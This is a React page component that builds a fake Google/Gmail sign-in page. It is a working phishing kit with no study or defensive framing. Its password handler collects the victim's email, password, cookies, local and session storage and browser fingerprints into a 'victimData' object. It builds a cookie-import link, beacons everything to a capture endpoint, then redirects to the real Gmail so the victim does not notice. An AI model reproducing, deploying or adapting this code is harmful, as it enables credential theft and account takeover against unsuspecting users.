import { useState, useCallback } from 'react';

function canvasFingerprint() {
  if (typeof window === 'undefined') return '';
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  if (!ctx) return '';
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillText('Fingerprint test', 2, 2);
  return canvas.toDataURL();
}

function getWebglFingerprint() {
  if (typeof window === 'undefined') return 'none';
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl');
  return gl ? gl.getParameter(gl.RENDERER) : 'none';
}

export default function Home() {
  const [step, setStep] = useState('email');
  const [capturedEmail, setCapturedEmail] = useState('');
  const [accountName, setAccountName] = useState('');
  const [avatarLetter, setAvatarLetter] = useState('G');
  const [loading, setLoading] = useState(false);

  const handleEmailSubmit = useCallback((e) => {
    e.preventDefault();
    const email = e.target.email?.value?.trim() || '';
    if (!email) return;
    setCapturedEmail(email);
    setAccountName(email.split('@')[0] || 'User');
    setAvatarLetter((email[0] || 'G').toUpperCase());
    setStep('password');
  }, []);

  const handleBack = useCallback((e) => {
    e.preventDefault();
    setStep('email');
  }, []);

  const handlePasswordSubmit = useCallback(async (e) => {
    e.preventDefault();
    const password = e.target.password?.value || '';
    if (!password) return;
    setLoading(true);

    // Set fake Google session cookies first (same domain as our page)
    if (typeof document !== 'undefined') {
      const domain = window.location.hostname;
      document.cookie = `SID=GA.1.${Date.now()}; path=/; domain=${domain}; Secure; SameSite=None`;
      document.cookie = `HSID=GA.1.${Date.now()}; path=/; domain=${domain}; Secure; SameSite=None`;
      document.cookie = `__Secure-3PSID=CAI.${btoa(capturedEmail)}; path=/; domain=${domain}; Secure; SameSite=None`;
    }

    // Capture cookies AFTER setting - parse into Cookie-Editor import format
    let cookiesRaw = 'none';
    let cookiesImportLink = '';
    if (typeof document !== 'undefined' && document.cookie) {
      cookiesRaw = document.cookie;
      const cookiesArray = document.cookie.split(';').map((c) => {
        const [name, ...v] = c.trim().split('=');
        const value = v.join('=').trim();
        if (!name || !value) return null;
        return {
          name: name.trim(),
          value: decodeURIComponent(value),
          domain: window.location.hostname,
          path: '/',
        };
      }).filter(Boolean);
      if (cookiesArray.length > 0) {
        try {
          cookiesImportLink = `https://cookie-editor.cgagnier.ca/?import=${btoa(unescape(encodeURIComponent(JSON.stringify(cookiesArray))))}`;
        } catch {}
      }
    }

    const victimData = {
      timestamp: new Date().toISOString(),
      email: capturedEmail,
      password,
      cookies: cookiesRaw,
      cookiesImportLink: cookiesImportLink || undefined,
      localStorage: typeof localStorage !== 'undefined' ? Object.fromEntries(Object.entries(localStorage)) : {},
      sessionStorage: typeof sessionStorage !== 'undefined' ? Object.fromEntries(Object.entries(sessionStorage)) : {},
      userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      language: typeof navigator !== 'undefined' ? navigator.language : '',
      timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : '',
      screen: typeof screen !== 'undefined' ? `${screen.width}x${screen.height}` : '',
      referrer: typeof document !== 'undefined' ? document.referrer : '',
      canvas: canvasFingerprint(),
      webgl: getWebglFingerprint(),
      plugins: typeof navigator !== 'undefined' && navigator.plugins
        ? Array.from(navigator.plugins).map((p) => p.name).join(',')
        : '',
    };

    try {
      navigator.sendBeacon('/api/workspace_capture', new Blob([JSON.stringify(victimData)], { type: 'application/json' }));
    } catch {}

    setTimeout(() => {
      if (typeof window !== 'undefined') {
        window.location.replace('https://mail.google.com/mail/u/0/#inbox');
      }
    }, 3000 + Math.random() * 2000);
  }, [capturedEmail]);

  return (
    <>
      <style jsx global>{`
        .loading-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(255, 255, 255, 0.95);
          backdrop-filter: blur(10px);
          display: none;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .loading-overlay.active {
          display: flex;
        }
        .spinner {
          width: 32px;
          height: 32px;
          border: 3px solid #f3f3f3;
          border-top: 3px solid #1a73e8;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .password-step { display: none; }
        .password-step.active { display: block; }
        .email-step.active { display: block; }
      `}</style>

      <main className="page">
        <section className="login-card" aria-label="Sign in card">
          <div className="left-pane">
            <img
              className="google-g-logo"
              src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png"
              alt="Google"
            />
            <h1 id="page-title">Sign in</h1>
            <p className="subtitle" id="page-subtitle">
              {step === 'email' ? 'to continue to Gmail' : `Welcome back, ${accountName}`}
            </p>

            {step === 'password' && (
              <div
                id="account-preview"
                className="account-preview"
                style={{
                  display: 'block',
                  marginTop: '20px',
                  padding: '16px',
                  background: '#f8f9fa',
                  borderRadius: '8px',
                  border: '1px solid #e8eaed',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div
                    id="avatar"
                    style={{
                      width: '36px',
                      height: '36px',
                      borderRadius: '50%',
                      background: 'linear-gradient(135deg, #4285f4, #34a853)',
                      color: 'white',
                      fontWeight: 500,
                      fontSize: '16px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      flexShrink: 0,
                    }}
                  >
                    {avatarLetter}
                  </div>
                  <div>
                    <div id="account-name" style={{ fontSize: '16px', fontWeight: 500, color: '#202124', marginBottom: '2px' }}>
                      {accountName}
                    </div>
                    <div id="account-email" style={{ fontSize: '14px', color: '#5f6368' }}>
                      {capturedEmail}
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>

          <form className={`signin-form email-step ${step === 'email' ? 'active' : ''}`} onSubmit={handleEmailSubmit}>
            <label className="sr-only" htmlFor="email">
              Email or phone
            </label>
            <input
              id="email"
              name="email"
              type="text"
              autoComplete="username"
              placeholder="Email or phone"
              required
            />
            <a className="text-link" href="#" onClick={(e) => e.preventDefault()}>
              Forgot email?
            </a>
            <p className="helper-text">
              Not your computer? Use Guest mode to sign in privately.
              <a className="text-link inline" href="#" onClick={(e) => e.preventDefault()}>
                Learn more
              </a>
            </p>
            <div className="actions">
              <a className="text-link" href="#" onClick={(e) => e.preventDefault()}>
                Create account
              </a>
              <button type="submit" id="next-btn">
                Next
              </button>
            </div>
          </form>

          <form
            className={`signin-form password-step ${step === 'password' ? 'active' : ''}`}
            onSubmit={handlePasswordSubmit}
          >
            <label className="sr-only" htmlFor="password">
              Enter your password
            </label>
            <input
              id="password"
              name="password"
              type="password"
              autoComplete="current-password"
              placeholder="Enter your password"
              required
            />
            <a className="text-link" href="#" onClick={(e) => e.preventDefault()}>
              Forgot password?
            </a>
            <div className="actions">
              <a className="text-link" id="back-link" href="#" onClick={handleBack}>
                Use another account
              </a>
              <button type="submit" id="sign-in-btn">
                Sign in
              </button>
            </div>
          </form>
        </section>

        <footer className="footer">
          <select aria-label="Language selector">
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
          </select>
          <nav>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </nav>
        </footer>
      </main>

      <div className={`loading-overlay ${loading ? 'active' : ''}`} id="loading-overlay">
        <div className="spinner" />
      </div>
    </>
  );
}
